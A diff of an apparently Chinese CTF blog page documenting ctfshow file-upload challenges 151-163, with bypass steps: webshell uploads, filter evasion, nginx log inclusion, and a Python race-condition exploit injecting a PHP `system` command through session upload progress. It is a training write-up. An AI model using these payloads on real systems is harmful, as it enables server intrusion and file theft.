@@ -8,43 +8,44 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
     <meta name="description" content="前台校验   前段代码有限制文件后缀为png文件，抓包修改即可，里面写一句话木马    后端不能单一校验 这关应该就是前段验证后缀+后端验证Content-Type，思路和上一关一致  后端不能单一校验 沿用上一关思路，会出现文件上传失败，失败原因：文件类型不合规 这一关考察上传.user.ini文件绕过 使用前提：因为.user.ini只对他同一目录下的文件起作用，也就是说，只有他同目录下有p">
 <meta property="og:type" content="article">
-<meta property="og:title" content="RacerZ">
+<meta property="og:title" content="CTFSHOW-文件上传">
 <meta property="og:url" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
 <meta property="og:site_name" content="RacerZ">
 <meta property="og:description" content="前台校验   前段代码有限制文件后缀为png文件，抓包修改即可，里面写一句话木马    后端不能单一校验 这关应该就是前段验证后缀+后端验证Content-Type，思路和上一关一致  后端不能单一校验 沿用上一关思路，会出现文件上传失败，失败原因：文件类型不合规 这一关考察上传.user.ini文件绕过 使用前提：因为.user.ini只对他同一目录下的文件起作用，也就是说，只有他同目录下有p">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220904102825916.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220904103259361.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220904105848600.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220904105958782.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220904111853140.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220904114409410.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220904114539533.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220905192827343.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220905193010619.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220905200639583.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220905200857127.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220905203343520.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220906102747456.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220906102719476.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220906103236164.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220907210841653.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220907211524462.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220907233253334.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220908144016297.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220908143025400.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220908143938862.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220908144843577.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220908145303461.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220908153657940.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220908153852171.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220908155414030.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/image-20220908154758370.png">
-<meta property="article:published_time" content="2022-09-08T15:44:09.096Z">
-<meta property="article:modified_time" content="2022-09-08T07:55:55.000Z">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904102825916.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904103259361.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904105848600.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904105958782.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904111853140.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904114409410.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904114539533.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220905192827343.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220905193010619.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220905200639583.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220905200857127.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220905203343520.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220906102747456.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220906102719476.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220906103236164.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220907210841653.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220907211524462.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220907233253334.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220908144016297.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220908143025400.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220908143938862.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220908144843577.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220908145303461.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220908153657940.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220908153852171.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220908155414030.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220908154758370.png">
+<meta property="article:published_time" content="2022-09-07T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-09-08T16:23:22.344Z">
 <meta property="article:author" content="RacerZ">
+<meta property="article:tag" content="ctfshow">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://racerz-fighting.github.io/image-20220904102825916.png">
+<meta name="twitter:image" content="https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904102825916.png">
     
     
       
@@ -64,7 +65,7 @@
       
     
     <!-- title -->
-    <title>RacerZ</title>
+    <title>CTFSHOW-文件上传</title>
     <!-- styles -->
     
 <link rel="stylesheet" href="/css/style.css">
@@ -103,7 +104,7 @@
       <ul>
         
         
-        <li><a class="icon" aria-label="Next post" href="/2022/07/05/hello-world/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Next post" href="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
@@ -117,16 +118,16 @@
     <div id="share" style="display: none">
       <ul>
   <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&text="><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title="><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&is_video=false&description="><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=&body=Check out this article: https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title="><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title="><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title="><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title="><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&name=&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&t="><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&text=CTFSHOW-文件上传"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=CTFSHOW-文件上传"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&is_video=false&description=CTFSHOW-文件上传"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTFSHOW-文件上传&body=Check out this article: https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=CTFSHOW-文件上传"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=CTFSHOW-文件上传"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=CTFSHOW-文件上传"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=CTFSHOW-文件上传"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&name=CTFSHOW-文件上传&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&t=CTFSHOW-文件上传"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -143,7 +144,7 @@
   <header>
     
     <h1 class="posttitle" itemprop="name headline">
-        
+        CTFSHOW-文件上传
     </h1>
 
 
@@ -155,7 +156,7 @@
       
     <div class="postdate">
       
-        <time datetime="2022-09-08T15:44:09.096Z" itemprop="datePublished">2022-09-08</time>
+        <time datetime="2022-09-07T16:00:00.000Z" itemprop="datePublished">2022-09-08</time>
         
       
     </div>
@@ -164,6 +165,11 @@
       
 
       
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/ctfshow/" rel="tag">ctfshow</a>
+    </div>
+
 
     </div>
   </header>
@@ -172,10 +178,10 @@
   <div class="content" itemprop="articleBody">
     <ol start="151">
 <li><p>前台校验</p>
-<img src="/image-20220904102825916.png" alt="image-20220904102825916" style="zoom:50%;" /></li>
+<img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904102825916.png" alt="image-20220904102825916" style="zoom:50%;"></li>
 </ol>
 <p>前段代码有限制文件后缀为png文件，抓包修改即可，里面写一句话木马</p>
-<img src="/image-20220904103259361.png" alt="image-20220904103259361" style="zoom:50%;" />
+<img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904103259361.png" alt="image-20220904103259361" style="zoom:50%;">
 
 <ol start="152">
 <li><p>后端不能单一校验</p>
@@ -190,9 +196,9 @@
 
 
 
-<img src="/image-20220904105848600.png" alt="image-20220904105848600" style="zoom:50%;" />
+<img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904105848600.png" alt="image-20220904105848600" style="zoom:50%;">
 
-<img src="/image-20220904105958782.png" alt="image-20220904105958782" style="zoom:50%;" /></li>
+<img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904105958782.png" alt="image-20220904105958782" style="zoom:50%;"></li>
 <li><p><strong>后端不能单二校验</strong></p>
 <p>这一关检测的是上传文件内容中不能包含<code>&lt;(.*)php</code></p>
 <p>所以更换简约的php标签</p>
@@ -205,7 +211,7 @@
 </li>
 <li><p>后端不能单四校验</p>
 <p>这关对<code>[]</code>有过滤，这里可以利用<code>&#123;&#125;</code>来绕过</p>
-<p><img src="/image-20220904111853140.png" alt="image-20220904111853140"></p>
+<p><img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904111853140.png" alt="image-20220904111853140"></p>
 </li>
 <li><p>后端不能单五校验</p>
 <p><strong>过滤了{}和分号</strong></p>
@@ -222,17 +228,17 @@
 <p>题目的中间件平台为nginx服务器，所以日志文件为<code>/var/log/nginx/access.log</code>，而<code>log</code>关键字被过滤了，我们采用字符串拼接的方式来绕过</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=include&quot;/va&quot;.&quot;r/lo&quot;.&quot;g/ngi&quot;.&quot;nx/a&quot;.&quot;ccess&quot;.&quot;.l&quot;.&quot;og&quot;?&gt;</span><br><span class="line">空格也过滤啦！！</span><br><span class="line">&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/image-20220904114409410.png" alt="image-20220904114409410"></p>
+<p><img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904114409410.png" alt="image-20220904114409410"></p>
 </li>
 </ol>
-<img src="/image-20220904114539533.png" alt="image-20220904114539533" style="zoom:50%;" />
+<img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904114539533.png" alt="image-20220904114539533" style="zoom:50%;">
 
 <ol start="161">
 <li><p>增加了文件头检查</p>
 <p>在上一关的基础上加入文件头</p>
-<img src="/image-20220905192827343.png" alt="image-20220905192827343" style="zoom:50%;" /></li>
+<img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220905192827343.png" alt="image-20220905192827343" style="zoom:50%;"></li>
 </ol>
-<img src="/image-20220905193010619.png" alt="image-20220905193010619" style="zoom:50%;" />
+<img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220905193010619.png" alt="image-20220905193010619" style="zoom:50%;">
 
 <ol start="162">
 <li><p>session文件包含</p>
@@ -248,24 +254,24 @@
 <p>超了，这关把<code>.</code>也给过滤了，或者直接对session文件进行包含也可以</p>
 </li>
 </ol>
-<img src="/image-20220905200639583.png" alt="image-20220905200639583" style="zoom:50%;" />
+<img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220905200639583.png" alt="image-20220905200639583" style="zoom:50%;">
 
-<img src="/image-20220905200857127.png" alt="image-20220905200857127" style="zoom:50%;" />
+<img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220905200857127.png" alt="image-20220905200857127" style="zoom:50%;">
 
 <p>贴一下学习的exp，主要是多线程和文件上传的运用</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=gbk</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">url1 = <span class="string">&quot;http://dab9b049-0090-4749-b143-e54abfc39e80.challenge.ctf.show/upload.php&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://dab9b049-0090-4749-b143-e54abfc39e80.challenge.ctf.show/upload/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;racerz&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;racerz&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.post(url1, data=data, files=file, cookies=cookies)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.get(url2)</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),threading.Thread(target=read)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    threading.Thread(target=write).start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    threading.Thread(target=read).start()</span><br></pre></td></tr></table></figure>
 
-<p><img src="/image-20220905203343520.png" alt="image-20220905203343520"></p>
+<p><img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220905203343520.png" alt="image-20220905203343520"></p>
 <p>线程数要开的大一点</p>
 <ol start="163">
 <li><p>这一关其实和大多数wp描述的不同。首先限制了访问流量，导致无法通过条件竞争的方式来将session文件包含。这里采取了.user.ini文件上传+远程文件包含的方式。我在include中请求一个远程的服务器地址，而回显的结果如果包含php代码的话则会在本地去执行。</p>
 <ol>
 <li><p>首先针对ip的绕过，一般的ip地址是以点号分割的，而我们这关已经把点号给过滤了。但是可以将其转换成整数的形式<a target="_blank" rel="noopener" href="https://www.bejson.com/convert/ip2int/">https://www.bejson.com/convert/ip2int/</a></p>
-<p><img src="/image-20220906102747456.png" alt="image-20220906102747456"></p>
